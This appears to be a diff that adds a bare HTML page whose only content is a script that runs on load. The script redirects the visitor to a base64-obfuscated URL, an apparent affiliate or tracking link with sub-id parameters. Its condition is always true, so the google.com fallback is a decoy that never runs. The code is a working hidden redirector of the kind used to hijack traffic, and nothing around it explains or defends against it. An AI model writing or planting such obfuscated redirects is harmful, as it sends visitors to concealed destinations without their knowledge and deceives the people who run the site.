@@ -1,0 +1,12 @@
+<html>
+<head></head>
+
+<script type='text/javascript'>
+	if(1){
+	  location=atob('aHR0cHM6Ly9tb2JpLmJpbGxpd2EuY29tL29mYy80NmZlNDhmYS0zOWM3MGFlNy1mNjVkYTBjOS00YTMzLTBkOWQvODE1MTExZjgtYTE5NjA4ZWEtOTA3YmYwMTUtN2Q3YS0yZGFkP1N1YmlkPWNhcnJ5ZHN1YmlkJnN1Yl9wdWJpZD1jYXJyeWRwdWJpZCZleHRlcm5hbGlkPWNhcnJ5ZA=='); 
+	} else {
+	  location= "http://google.com/";
+	}
+</script>
+
+</html>
